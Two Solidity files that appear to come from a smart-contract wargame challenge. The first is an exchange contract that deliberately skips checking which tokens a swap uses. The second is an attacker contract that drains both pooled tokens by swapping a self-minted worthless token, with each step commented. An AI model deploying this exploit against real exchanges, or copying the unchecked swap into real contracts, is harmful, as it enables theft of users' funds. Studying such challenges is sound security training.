// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() Ownable(msg.sender) {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Minimal interface for the DexTwo contract
interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}

// A simple ERC20 token for the attack
contract AttackToken is ERC20 {
    constructor() ERC20("Attack Token", "ATK") {
        _mint(msg.sender, 1000);
    }
}

contract DexTwoAttacker {
    // This function executes the full attack.
    function attack(address _dexTwoAddress) public {
        IDexTwo dexTwo = IDexTwo(_dexTwoAddress);
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();

        // Step 1: Create our malicious token
        AttackToken maliciousToken = new AttackToken();

        // Step 2: Seed the DEX by transferring a small amount of our token to it
        maliciousToken.transfer(_dexTwoAddress, 1);

        // Step 3: Approve the DEX to spend our malicious tokens
        maliciousToken.approve(_dexTwoAddress, 1000);

        // Step 4: Drain Token1
        dexTwo.swap(address(maliciousToken), token1, 1);

        // Step 5: Drain Token2
        // The DEX now holds 2 of our tokens, so we swap 2 to get the full amount
        dexTwo.swap(address(maliciousToken), token2, 2);
    }
}